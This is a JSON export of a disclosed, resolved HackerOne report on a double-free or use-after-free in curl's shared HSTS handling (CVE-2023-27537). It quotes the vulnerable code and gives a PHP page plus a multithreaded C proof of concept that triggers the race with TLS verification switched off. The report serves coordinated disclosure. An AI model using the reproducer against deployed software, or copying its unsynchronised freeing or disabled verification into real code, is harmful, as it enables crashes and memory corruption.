{
  "id": 1897203,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODk3MjAz",
  "url": "https://hackerone.com/reports/1897203",
  "title": "CVE-2023-27537: HSTS double-free",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2023-03-08T18:10:27.746Z",
  "submitted_at": "2023-03-08T18:10:27.876Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "kurohiro",
    "url": "/kurohiro",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 35663,
    "url": "https://hackerone.com/curl",
    "handle": "curl",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "curl",
      "twitter_handle": "",
      "website": "https://curl.se",
      "about": "cURL is an Open Source project providing a library and command-line tool doing internet transfers"
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [
    "CVE-2023-27537"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-03-20T11:24:38.300Z",
  "bug_reporter_agreed_on_going_public_at": "2023-03-20T11:24:38.184Z",
  "team_member_agreed_on_going_public_at": "2023-03-20T07:59:41.640Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nWhen processing HSTS with multi-threading, double-free or UAF may occur due to lack of exclusion control.\nHSTS entries disappear when they expire or when \"max-age=0\" is received.\nIn this case, the offending entry is removed from the internal memory list, freeing memory but not exclusivity control.\nTherefore, depending on the timing, other threads may perform the operation, resulting in double-free or UAF.\n\n`lib/hsts.c` in the function `Curl_hsts_parse` on lines 213-221\n```\n  if(!expires) {\n    /* remove the entry if present verbatim (without subdomain match) */\n    sts = Curl_hsts(h, hostname, FALSE);\n    if(sts) {\n      Curl_llist_remove(&h->list, &sts->node, NULL);\n      hsts_free(sts);\n    }\n    return CURLE_OK;\n  }\n```\n\nIf multiple threads process `hsts_free(sts);` at the same time, it becomes double-free.\nAnother problem is that UAF occurs when other threads access entries.\n\nLines 270-275 have a similar problem.\n\n## Steps To Reproduce:\n\n  1. [Prepare the following php.]\n```\n<?php\n$random = rand(0, 1);\nif($random == 0){\n        header(\"strict-transport-security: max-age=9999\");\n}else{\n        header(\"strict-transport-security: max-age=0\");\n}\n```\n  2. [Compile and run the following cpp.]\n```\n#include <stdio.h>\n#define HAVE_STRUCT_TIMESPEC // [Add] \n#include <pthread.h>\n#include <curl/curl.h>\n\n#define NUMT 100\n\nconst char* const url = \"https://test.local/poc.php\";\n\npthread_mutex_t lock[9];\n\nstatic void lock_cb(CURL* handle, curl_lock_data data,\n    curl_lock_access access, void* userptr)\n{\n    pthread_mutex_lock(&lock[data]); /* uses a global lock array */\n}\n\nstatic void unlock_cb(CURL* handle, curl_lock_data data,\n    void* userptr)\n{\n    pthread_mutex_unlock(&lock[data]); /* uses a global lock array */\n}\n\nstatic void* pull_one_url(void* shobject)\n{\n    CURL* curl;\n\n    for (int i = 0; i < 100; i++) {\n        curl = curl_easy_init();\n        curl_easy_setopt(curl, CURLOPT_URL, url);\n        curl_easy_setopt(curl, CURLOPT_HSTS, \"c:\\\\home\\\\hsts.txt\");\n        curl_easy_setopt(curl, CURLOPT_SHARE, shobject);\n        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);\n        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);\n        curl_easy_perform(curl); /* ignores error */\n        curl_easy_cleanup(curl);\n    }\n\n    return NULL;\n}\n\nint main(int argc, char** argv)\n{\n    pthread_t tid[NUMT] = {0};\n    int i;\n\n    for(i = 0;i<=9;i++)\n        pthread_mutex_init(&lock[i], NULL);\n    \n    /* Must initialize libcurl before any threads are started */\n    curl_global_init(CURL_GLOBAL_ALL);\n    CURLSH* shobject = curl_share_init();\n    curl_share_setopt(shobject, CURLSHOPT_SHARE, CURL_LOCK_DATA_HSTS);\n    curl_share_setopt(shobject, CURLSHOPT_LOCKFUNC, lock_cb);\n    curl_share_setopt(shobject, CURLSHOPT_UNLOCKFUNC, unlock_cb);\n    for (i = 0; i < NUMT; i++) {\n        int error = pthread_create(&tid[i],\n            NULL, /* default attributes please */\n            pull_one_url,\n            (void*)shobject);\n        if (0 != error)\n            fprintf(stderr, \"Couldn't run thread number %d, errno %d\\n\", i, error);\n        else\n            fprintf(stderr, \"Thread %d, gets %s\\n\", i, url);\n    }\n\n    /* now wait for all threads to terminate */\n    for (i = 0; i < NUMT; i++) {\n        pthread_join(tid[i], NULL);\n        fprintf(stderr, \"Thread %d terminated\\n\", i);\n    }\n    curl_share_cleanup(shobject);\n    curl_global_cleanup();\n    return 0;\n}\n\n```\nThe source was referred to under docs/examples.\n\nSupplement.\nURL is https://test.local/poc.php.\nphp that randomly memorizes and deletes HSTS entries.\nIt's hard to reproduce if it's random, but I've confirmed that the problem will occur.\nI attach an image of when the UAF happened(I tried in debug build).\nThe number of threads and the number of loops are increased in order to raise the possibility that the phenomenon will occur.\n{F2216003}\n\n## Impact\n\nDouble-free",
  "weakness": {
    "id": 49,
    "name": "Double Free"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 2216003,
      "file_name": "UAF.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/imsizp0xgfqi0k5ogf1azr575wqm?response-content-disposition=attachment%3B%20filename%3D%22UAF.png%22%3B%20filename%2A%3DUTF-8%27%27UAF.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQXJ3JMI5N%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T212553Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHwaCXVzLXdlc3QtMiJHMEUCIQCQC2CzoHMgYlJrfsLLEfTE2%2B830FshHXTGChZM79ihvgIgZ5JGZfTZMpkqG8xWoPcK7VOwnXgt0QXj4UzJyuo%2BG2YquwUI9f%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDJKKobWq%2F1ljKl2AYyqPBRh3FhZgORDT5HITt9EjNL%2FdAyN5Y9LjjJdjgujueHfJ1PyJX6HANaN2lptR%2Fezy4rE09ZTW%2BF57IhquTHUNZwHvWprJ2PuayuVekfzPyaQmDWMov6Yaq5fMev6Rm4u889i%2Bb9ycpcCmmTmDyv7h5XSl0Qi4OR4s06C6h2eUvUTWsTCdtco8b9Ali1KKDXE%2Bvwvkusu7obZPMaYqzd9vh4I74idm38uZ4acD9CFZJxgz%2FrxRoSZVVLJmFLYS9%2F7kYlD9QGppJMd137fCmk5VLFMNr%2Bs39kUDFqXbWS4NuYeF3XLJc7zgHlj95o9PwUsJKf%2F%2BYXAyzBXQt5Kgr67sxoWumIqaftahZ%2BKBtKXsIwB5RNWtFTdQfAOxHSd8YzKX%2BSohnFgiU1JEVlqei49U3L4ozNLGBckL%2FjD8DVMuScdzmAhvzLycZehg9V8558YhYh0DvD3audARKz4VmphjQGjQ95OMKZy69YDM5nelvpno7iDtnmgR7JGfdbXWGVYxrX%2Fbmn2alE3ydn5IFm9h2Pa6mhxIHc3r0GAOGiU1iHQfKNaSMmgv3ZAHRRz2%2BIsifj%2F%2Fg%2Ffgg9wyMNRL2cGRELL1juu9I56VGTMvtvBhiHk19fnM0vLXi3pVxW83xrHjxF6kbgajR80edOeQ8BPkEy66YInLOrTLJ37%2FVAH%2FnVl5STaMEcDXt9WwNaBQoEl%2FbQ7kdLXB9IroawW9Ro6S69Ngs2ynw1Q4qtRGR3oCzxQn%2F0r02t%2Bv1zwRlJZp8kNhqnvNjNw5uoBjRcu98DHlY%2FCx5jIzav3lg3%2FFK8ME4nt4dRzXaIxLQsz7txTkvZaPA8ZOdMnp3OabEqXl1wmf56Y3HtCtm7pyiL4N18lr8iYw1oS8xgY6sQE7QmJ5BhRIeFOM%2B6uqPfqqz49few8nreVqkx%2B3pRgoqfzRf5%2BrfucI0TTGC0nDUztSmWjvmawChujFOQcJV9vZQYdqIntoJvC41Q3TNbcW1UgyQLMpTpiyHN1BY0tiryNrZlWDQhOxdTBNIDRxLOBY%2FIIxwtFQ7W8rQhWsA1zgKmQMnI6%2FSNGUO2MRFeLtCY3OpSZ1hi9qbeYrU%2FJQIX9rTPMJn1YxRgzDcPC%2B24xPKeo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=25ed8735556301daf28e657a6385a04aefe3397400121dd3526b02648f51ec1f",
      "file_size": 172456,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2023-04-19T07:59:41.721Z",
  "allow_singular_disclosure_after": -76512371.92666653,
  "singular_disclosure_allowed": true,
  "vote_count": 12,
  "voters": [
    "sambamsam",
    "pentestor",
    "zy9ard3",
    "yassinek3ch",
    "shubham_srt",
    "jai-kandepu",
    "shivammusic",
    "anubis2000",
    "neimsaci",
    "log1",
    "and 2 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 18844,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/curl/curl",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
